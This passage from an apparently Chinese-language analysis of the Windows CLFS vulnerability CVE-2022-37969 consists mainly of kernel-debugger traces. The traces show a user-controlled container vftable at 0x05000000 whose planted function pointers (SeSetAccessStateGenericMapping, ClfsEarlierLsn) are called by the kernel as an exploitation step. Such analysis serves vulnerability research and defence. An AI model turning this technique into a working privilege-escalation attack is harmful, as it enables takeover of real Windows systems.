style="color:#ae81ff">11306</span>ede<span style="color:#ae81ff">4</span>c8b15c3d1ffff mov r10, qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">__imp_ExReleaseResourceForThreadLite</span> (fffff800113040a8)]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ee5 e8a655c203 call ntkrnlmp<span style="color:#f92672">!</span><span style="color:#a6e22e">ExReleaseResourceForThreadLite</span> (fffff80014f2c490)</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>eea<span style="color:#ae81ff">4532f</span><span style="color:#ae81ff">6</span> xor r14b, r14b</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>eed<span style="color:#ae81ff">4488742420</span> mov byte ptr [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>h], r14b</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ef2<span style="color:#ae81ff">488</span>b07 mov rax, qword ptr [rdi]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ef5<span style="color:#ae81ff">488</span>b4018 mov rax, qword ptr [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ef9<span style="color:#ae81ff">488</span>bcf mov rcx, rdi</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>efc ff15ced6ffff call qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">__guard_dispatch_icall_fptr</span> (fffff800113045d0)]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306f</span><span style="color:#ae81ff">02</span><span style="color:#ae81ff">488</span>b07 mov rax, qword ptr [rdi]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306f</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">488</span>b4008 mov rax, qword ptr [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306f</span><span style="color:#ae81ff">09</span><span style="color:#ae81ff">488</span>bcf mov rcx, rdi</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306f</span><span style="color:#ae81ff">0</span>c ff15bed6ffff call qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">__guard_dispatch_icall_fptr</span> (fffff800113045d0)]</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db r15</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de4d8<span style="color:#ae81ff">08</span> f0 fd c1<span style="color:#ae81ff">30</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">08</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#ae81ff">.0</span>...........</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de4e8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span>a0<span style="color:#ae81ff">93</span><span style="color:#ae81ff">50</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ..........P.....</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de4f8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de508<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de518<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de528<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de538<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de548<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> p</span></span><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>RemoveContainer<span style="color:#f92672">+</span><span style="color:#ae81ff">0x113</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ec3<span style="color:#ae81ff">4885ff</span> test rdi,rdi</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> rrdi</span></span><span style="display:flex;"><span>rdi<span style="color:#f92672">=</span><span style="color:#ae81ff">000000000050</span><span style="color:#ae81ff">93</span>a0</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dp rdi</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">93</span>a0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span> ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c018</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">93</span>b0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span> ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c018</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">93</span>c0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span> ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c018</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">93</span>d0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span> ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c018</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">005093e0</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span> ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c018</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">005093f</span><span style="color:#ae81ff">0</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span> ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c018</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">9400</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span> ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c018</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">9410</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span> ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c018</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23456789</span> fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da0</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000010</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span> fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cb0</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000020</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000030</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000040</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000050</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000060</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000070</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span></code></pre></div><p>该对象已经被用户层控制，<code>CClfsContainer</code>的vftable被指向05000000</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/16.png"/></p><p>在05000000+0x8和05000000+0x18处的两个函数指针分别是<code>SeSetAccessStateGenericMapping</code>和<code>ClfsEarlierLsn</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23456789</span> fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da0</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000010</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span> fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cb0</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000020</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000030</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000040</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000050</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000060</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000070</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> u fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da0</span></span><span style="display:flex;"><span>nt<span style="color:#f92672">!</span>SeSetAccessStateGenericMapping:</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da0<span style="color:#ae81ff">488</span>b4148 mov rax,qword ptr [rcx<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>h]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da4<span style="color:#ae81ff">0f</span><span style="color:#ae81ff">1002</span> movups xmm0,xmmword ptr [rdx]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da7 f30f7f4008 movdqu xmmword ptr [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>],xmm0</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>dac c3 ret</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>dad cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>dae cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>daf cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>db0 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> u fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cb0</span></span><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn:</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cb0<span style="color:#ae81ff">488</span>b05c1240000 mov rax,qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">CLFS_LSN_INVALID</span> (fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">4178</span>)]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cb7<span style="color:#ae81ff">4885</span>c9 test rcx,rcx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cba<span style="color:#ae81ff">7436</span> je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf2)</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cbc<span style="color:#ae81ff">488</span>b09 mov rcx,qword ptr [rcx]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cbf<span style="color:#ae81ff">483</span>b0d82210000 cmp rcx,qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">CLFS_LSN_NULL</span> (fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f3e48</span>)]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cc6<span style="color:#ae81ff">742</span>a je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf2)</span></span></code></pre></div><p>内核将依次调用<code>ClfsEarlierLsn</code>和<code>SeSetAccessStateGenericMapping</code></p><p>在<code>ClfsEarlierLsn</code>中edx被设为0xFFFFFFFF</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn:</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cb0<span style="color:#ae81ff">488</span>b05c1240000 mov rax, qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">CLFS_LSN_INVALID</span> (fffff800112f4178)]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cb7<span style="color:#ae81ff">4885</span>c9 test rcx, rcx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cba<span style="color:#ae81ff">7436</span> je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff800112f1cf2)</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cbc<span style="color:#ae81ff">488</span>b09 mov rcx, qword ptr [rcx]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cbf<span style="color:#ae81ff">483</span>b0d82210000 cmp rcx, qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">CLFS_LSN_NULL</span> (fffff800112f3e48)]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cc6<span style="color:#ae81ff">742</span>a je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff800112f1cf2)</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cc8<span style="color:#ae81ff">483</span>bc8 cmp rcx, rax</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>ccb<span style="color:#ae81ff">7425</span> je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff800112f1cf2)</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>ccd<span style="color:#ae81ff">83</span>caff or edx,<span style="color:#ae81ff">0FF</span>FFFFFFh</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cd0<span style="color:#ae81ff">48894</span>c2408 mov qword ptr [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>], rcx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cd5<span style="color:#ae81ff">03</span>ca add ecx, edx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cd7<span style="color:#ae81ff">894</span>c2408 mov dword ptr [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>], ecx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cdb<span style="color:#ae81ff">3</span>bca cmp ecx, edx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cdd<span style="color:#ae81ff">750</span>e jne CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3d</span> (fffff800112f1ced)</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cdf<span style="color:#ae81ff">8</span>b4c240c mov ecx, dword ptr 